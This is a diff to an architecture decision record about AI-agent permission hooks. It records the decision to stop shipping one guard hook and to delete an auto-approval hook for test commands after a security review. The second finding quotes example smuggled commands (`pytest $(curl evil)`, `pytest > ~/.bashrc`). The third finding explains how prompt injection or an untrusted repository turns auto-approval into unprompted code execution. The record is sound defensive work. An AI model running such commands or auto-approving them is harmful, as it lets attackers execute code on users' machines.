@@ -1,9 +1,11 @@
 # ADR-085: cross-harness permission-surface asymmetry (#3217, epic #3197)
 
 Records why migrating the two survivor guard hooks to host-native permissions
-is NOT the clean swap #3217 assumed. Status: proposed (owner ratifies).
+is not the clean swap #3217 assumed. Status: accepted. D-A is internal-only.
+D-B was initially keep-as-hook, then explicitly superseded by deletion after a
+deeper security review.
 
-## Two verified findings (2026-07-20)
+## Three verified findings (2026-07-20)
 
 1. **Copilot has no repo-committed permission surface; `skill_first_guard`
    self-neuters.** Copilot CLI 1.0.72 ships no permission file a repo can commit.
@@ -21,12 +23,29 @@ is NOT the clean swap #3217 assumed. Status: proposed (owner ratifies).
    auto-approve `pytest $(curl evil)` and `pytest > ~/.bashrc`. A deny companion
    cannot cleanly close it (global scope, undocumented `$` glob escaping).
 
-## Open owner decisions (deferred, not implemented)
-- D-A: is skill_first_guard customer-facing (fix + keep) or internal (relocate to
-  .githooks/CI per ADR-084 rule 4, which bans self-neutering hooks on the vendored
-  surface)?
-- D-B: keep (recommended), migrate, or delete test_auto_approval?
-Advisor compression: "protect consumers, or only yourself?"
+3. **A runner name is not a safety boundary.** Exact `pytest`, Pester, and
+   package-test commands still execute repository-controlled fixtures, imports,
+   plugins, configuration, and scripts. Metacharacter screening protects command
+   syntax, not the selected code. Auto-approval therefore grants unprompted
+   user-level code execution under prompt injection or an untrusted repository.
+
+## Owner decisions
+
+- D-A: internal-only. Stop shipping `skill_first_guard` to consumers. #3217
+  must select either a repository-only PreToolUse carrier or explicit
+  retirement of real-time enforcement. Git hooks and CI can enforce only the
+  actions they observe; they are not raw-command interceptors.
+- D-B: delete `test_auto_approval`. Remove its registrations and generated
+  Copilot artifacts. Do not replace it with `permissions.allow`. Retain the
+  generic PermissionRequest adapter without an active producer.
+
+The owner selected deletion after being shown the conflict with the accepted
+keep-as-hook decision. ADR-085 and ADR-068 now align.
+
+Any future hook-to-permissions migration must pass three tests: a committed
+surface on every target harness, semantic fidelity, and a real safety boundary
+in the underlying policy. Portability and fidelity cannot legalize an unsafe
+approval rule.
 
 ## Reusable process finding (guard bug worth fixing)
 `invoke_adr_review_guard.py` line 78 sets `_AGENTS_DEBATE = ".agents/analysis/"`
@@ -38,5 +57,13 @@ reviewed. Not fixed in #3274 (out of scope). Candidate follow-up: point the guar
 at `.agents/critique/` and match the specific ADR number.
 
 ## Landed
-PR #3274 (branch docs/3217-adr-085-permission-asymmetry). ADR + debate log +
-session log. `mem:` see also .agents/critique/ADR-085-debate-log.md.
+
+- PR #3274 added proposed ADR-085 and its initial debate.
+- PR #3276 accepted ADR-085 with D-A internal-only and the now-superseded D-B
+  keep-as-hook decision.
+- `fix/copilot-hook-contract` carries the D-B deletion amendment, review evidence,
+  producer removal, generated cleanup, and absence regressions.
+- Historical initial debate:
+  `.agents/analysis/ADR-085-permission-surface-debate.md`.
+- Superseding security amendment:
+  `.agents/critique/ADR-085-debate-log.md`.
